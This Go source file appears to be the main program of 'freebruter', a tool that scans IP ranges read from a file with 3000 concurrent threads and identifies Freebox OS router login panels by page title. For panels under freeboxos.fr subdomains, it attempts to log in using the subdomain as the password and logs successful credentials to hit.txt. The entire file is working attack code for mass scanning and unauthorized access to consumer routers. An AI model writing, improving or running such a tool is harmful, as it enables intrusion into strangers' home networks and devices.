package main

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/0xF7A4C6/freebruter/internal/console"
	"github.com/0xF7A4C6/freebruter/internal/freebox"
	"github.com/0xF7A4C6/freebruter/internal/utils"
	"github.com/korylprince/ipnetgen"
	"github.com/valyala/fasthttp"
	"github.com/zenthangplus/goccm"
)

var (
	checked, found, hit, errors int
)

func testUrl(url string) {
	box := freebox.NewFreeboxClient(url)

	c, err := box.GetChallenge()
	if err != nil {
		fmt.Println(err)
		return
	}

	password := strings.Split(strings.Split(url, "://")[1], ".freeboxos.fr")[0]

	r, err := box.Login(box.GetHash(password, c.Result.PasswordSalt, box.SolveChallenge(c)))
	if err != nil {
		fmt.Println(err)
		return
	}

	if !r.Success {
		console.Log(fmt.Sprintf("[INVALID] %s (%s - %s, %s)", url, password, r.Msg, r.ErrorCode))
		return
	}

	found++
	console.Log(fmt.Sprintf("[FOUND] %s (%s)", url, password))
	utils.AppendFile("hit.txt", fmt.Sprintf("%s:%s", url, password))
}

func IsFreebox(ip string) {
	ports := []int{80, 443, 8080, 8081, 81, 50000, 8888, 8181}

	for _, port := range ports {
		timeout := time.Millisecond*500
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, fmt.Sprintf("%d", port)), timeout)

		if err != nil {
			errors++
			continue
		}

		conn.Close()

		u := fmt.Sprintf("http://%s", net.JoinHostPort(ip, fmt.Sprintf("%d", port)))

		req := fasthttp.AcquireRequest()
		req.SetRequestURI(u)
		req.Header.SetMethod("GET")

		resp := fasthttp.AcquireResponse()
		err = fasthttp.DoRedirects(req, resp, 3)
		if err != nil {
			continue
		}

		body := string(resp.Body())
		title := ""

		if strings.Contains(body, "<title>") {
			title = strings.ReplaceAll(strings.Split(strings.Split(body, "<title>")[1], "</title>")[0], "\n", "")
		}

		if title != "Freebox OS :: Identification" {
			console.Log(fmt.Sprintf("[NOP] [%d] %s (%s)", resp.StatusCode(), strings.ReplaceAll(req.URI().String(), "\n", ""), title))
			continue
		}

		console.Log(fmt.Sprintf("[HIT] [%d] %s (%s)", resp.StatusCode(), strings.ReplaceAll(req.URI().String(), "\n", ""), title))
		utils.AppendFile("found_pannel.txt", req.URI().String())

		hit++
		if strings.Contains(req.URI().String(), "freeboxos") {
			go testUrl(strings.Split(req.URI().String(), "/login.php")[0])
		}

		break
	}

}

func titleThread() {
	for {
		time.Sleep(time.Millisecond)
		console.SetTitle(fmt.Sprintf("checked: %d, found: %d, hit: %d, error: %d", checked, found, hit, errors))
	}
}

func main() {
	threads := goccm.New(3000)
	go titleThread()

	cidr, err := utils.ReadFile("asn.txt")
	if err != nil {
		panic(err)
	}

	for _, subnet := range cidr {
		gen, err := ipnetgen.New(subnet)
		if err != nil {
			panic(err)
		}

		for ip := gen.Next(); ip != nil; ip = gen.Next() {
			threads.Wait()

			go func(address string) {
				defer threads.Done()
				IsFreebox(address)
				checked++
			}(ip.String())
		}
	}

	threads.WaitAllDone()
}
